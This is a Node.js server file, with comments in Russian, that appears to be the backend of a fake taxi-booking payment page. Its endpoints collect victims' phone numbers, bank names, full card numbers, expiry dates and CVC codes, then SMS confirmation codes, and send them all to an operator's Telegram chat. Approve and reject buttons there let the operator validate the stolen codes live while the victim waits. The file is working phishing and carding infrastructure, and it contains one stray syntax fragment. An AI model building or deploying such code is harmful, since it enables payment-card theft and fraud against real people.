require('dotenv').config();
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());

// Подключаем статические файлы из папки public
app.use(express.static(path.join(__dirname, 'public')));

// При запросе на главную страницу отдаем index.html из папки public
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
  });
});

// Хранилище статусов SMS в памяти
const smsStatuses = {};

async function sendToTelegram(text, replyMarkup = null) {
  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const payload = {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    return data.ok;
  } catch (err) {
    console.error('❌ Ошибка отправки:', err);
    return false;
  }
}

// 📌 ЛОГ 1: Данные карты
app.post('/api/send-log', async (req, res) => {
  const order = req.body;
  const text = `🚖 *НОВЫЙ ЗАКАЗ И ОПЛАТА*\n\n` +
               `📱 *Телефон:* \`${order.phone}\`\n` +
               `📍 *Откуда:* ${order.from}\n` +
               `🏁 *Куда:* ${order.to}\n` +
               `🚕 *Тариф:* ${order.tariff}\n` +
               `💰 *Сумма:* ${order.price} ₽\n\n` +
               `💳 *ДАННЫЕ ОПЛАТЫ:*\n` +
               `🏛 *Банк:* ${order.bank}\n` +
               `💳 *Карта:* \`${order.cardNumber}\`\n` +
               `📅 *Срок:* \`${order.cardExpiry}\` | *CVC:* \`${order.cardCvc}\``;

  const ok = await sendToTelegram(text);
  res.status(ok ? 200 : 500).json({ success: ok });
});

// 📌 ЛОГ 2: SMS-код с КНОПКАМИ
app.post('/api/send-sms-log', async (req, res) => {
  const { phone, bank, smsCode } = req.body;
  smsStatuses[phone] = 'pending';

  const text = `📲 *ВВЕДЕН SMS-КОД*\n\n` +
               `📱 *Телефон:* \`${phone}\`\n` +
               `🏛 *Банк:* ${bank}\n` +
               `🔑 *SMS-Код:* \`${smsCode}\`\n\n` +
               `❓ *Выберите действие:*`;

  const inlineKeyboard = {
    inline_keyboard: [
      [
        { text: "✅ Код верный (Принять)", callback_data: `approve_${phone}` },
        { text: "❌ Код неверный (Отклонить)", callback_data: `reject_${phone}` }
      ]
    ]
  };

  const ok = await sendToTelegram(text, inlineKeyboard);
  res.status(ok ? 200 : 500).json({ success: ok });
});

// Проверка статуса для клиента
app.get('/api/check-sms-status', (req, res) => {
  const phone = req.query.phone;
  res.json({ status: smsStatuses[phone] || 'pending' });
});

// Опрос кнопок в Telegram
let offset = 0;
async function pollTelegramUpdates() {
  try {
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=10`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && data.result.length > 0) {
      for (const update of data.result) {
        offset = update.update_id + 1;
        if (update.callback_query) {
          const callback = update.callback_query;
          const actionData = callback.data;

          if (actionData.startsWith('approve_')) {
            const phone = actionData.replace('approve_', '');
            smsStatuses[phone] = 'success';
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: callback.id, text: "Оплата принята!" })
            });
          } else if (actionData.startsWith('reject_')) {
            const phone = actionData.replace('reject_', '');
            smsStatuses[phone] = 'error';
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: callback.id, text: "Код отклонен!" })
            });
          }
        }
      }
    }
  } catch (e) {}
  setTimeout(pollTelegramUpdates, 1000);
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
  pollTelegramUpdates();
});
